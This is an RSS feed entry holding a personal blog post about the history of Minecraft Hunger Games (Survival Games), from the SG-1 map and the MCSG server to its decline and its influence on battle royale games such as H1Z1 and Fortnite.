		<link>https://nathaneberhardt.com/2020/09/24/mcsg/</link>
					<comments>https://nathaneberhardt.com/2020/09/24/mcsg/#respond</comments>
		
		<dc:creator><![CDATA[Nathan]]></dc:creator>
		<pubDate>Thu, 24 Sep 2020 19:37:56 +0000</pubDate>
				<category><![CDATA[Misc]]></category>
		<guid isPermaLink="false">https://nathaneberhardt.com/?p=1</guid>

					<description><![CDATA[Minecraft Hunger Games, a.k.a, Minecraft Survival Games is one of Minecraft&#8217;s most famous game modes of all time. Minecraft Hunger Games was founded in March 23, 2012, and was based on the popular &#8220;Hunger Games&#8221; movie that was released in early 2012. If you have no idea what Minecraft is, or even Hunger Games, let...]]></description>
										<content:encoded><![CDATA[
<p>Minecraft Hunger Games, a.k.a, Minecraft Survival Games is one of Minecraft&#8217;s most famous game modes of all time. Minecraft Hunger Games was founded in March 23, 2012, and was based on the popular &#8220;Hunger Games&#8221; movie that was released in early 2012. If you have no idea what Minecraft is, or even Hunger Games, let me explain briefly: Minecraft is a sandbox game that allows players to build, explore, and create virtually anything from their imagination. Hunger games is a concept created by Suzanne Collins where 24 randomly chosen children are selected to compete in a battle royale to the death. Although it may seem off-putting to put this type of concept into a video game, the idea of battle royale games would later lead to the creation of some of the most popular video games to date, such as Fortnite and PUBG. In a battle royale, players must fight to the last man standing. There is no second place, no third place, or even last place; only one winner will remain at the end. You are allowed to form teams and make alliances during the game, but all players must figure out how to keep themselves alive to the very end. Minecraft Hunger Games was later renamed to &#8220;Survival Games&#8221; in later iterations of the game mode.</p>



<p>Creating the world of Hunger Games in Minecraft was first thought of by a build team named Vareide, when they created the first hunger games map known as &#8220;SG-1&#8221;. The map payed tribute to the blockbuster franchise by spawning players in a circle around a &#8220;cornucopia,&#8221; which was filled with a large selection of weapons and gear. At game start, the player could either choose to rush towards the center and risk dying to the other players, or play it safe and run into the wild. However the player chose to plan out their strategies, everyone would eventually be forced into the center of the map after a given time. Players that died could continue to spectate the game, and even sponsor the remaining players with special items and gear. This was very similar to the Hunger Games movie where sponsors could donate food or medicine which could be dropped in the arena via parachutes. All aspects of SG-1 were implemented in an attempt to recreate the environment and feeling of the original Hunger Games.</p>



<figure class="wp-block-image size-full is-resized is-style-default"><img loading="lazy" src="https://nathaneberhardt.com/wp-content/uploads/2020/09/sg1.jpg" alt="SG-1" class="wp-image-155" width="585" height="328"/><figcaption>SG-1 Map</figcaption></figure>



<p>Just after a month of the release of SG-1, Minecraft Survival Games blew up in popularity, after a group of well-known youtubers collaborated together to play the map. The video, which was titled &#8220;Minecraft: Hunger Games Survival with Friends&#8221; garnered over 10 million views, and sparked interest in other Minecraft players who wanted to try this game mode out for themselves. Players were innovative, and over time new maps were added, and extra features were implemented to improve the gameplay experience.</p>



<p>One Minecraft server in particular become the dominating hub of the Hunger Games game mode, and it was known as MCSG. MCSG introduced a competitive scene for Survival Games, and players from around the world could test their skills on this server. The server featured a point system, where if players won, they would get a certain amount of points, and a leaderboard would track the total amount of points earned by each player. MCSG set the stage for Survival Games for years to come, and over time new servers would be created to try and make their own version of the game mode.</p>



<p>Unfortunately, in 2016, Minecraft Survival Games faced some major issues. Hackers and cheaters become more prominent, and players become extremely frustrated when they had to compete against large teams in their games when playing solo. In addition, Minecraft itself came out with several controversial updates that changed the way player combat behaved. It became apparent that most of these problems were almost impossible to resolve, and as a result MCSG died a bitter death. Other servers faced similar problems, and they too would eventually die off.</p>



<p>However, the story of battle royale games did not die off with Minecraft. Game developers took this new and exciting concept to create their own games. H1Z1 was a game released in 2015 that gained huge popularity, and it featured a post-apocalyptic map where 200 players would fight to the last man standing. H1Z1 had little in common with the original Hunger Games setting, other than that it was a battle royale game. Players entered the map via skydiving, and used guns as their primary weapons. </p>



<p>Future battle royale game would stray away from the original concept of Hunger Games, and would more closely represent games like H1Z1, featuring more modern weapons and designs. Games like Fortnite would later become one of the most popular games to ever exist.</p>



<p>Being a Minecraft Survival Games fan myself, I don&#8217;t necessarily consider the fall of MCSG as a a tragic event. Survival Games set the stage for what battle royale games would become and evolve into. It&#8217;s interesting to see how game developers have taken this mode into their own hands in order to entertain the lives of millions all over the world.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://nathaneberhardt.com/2020/09/24/mcsg/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
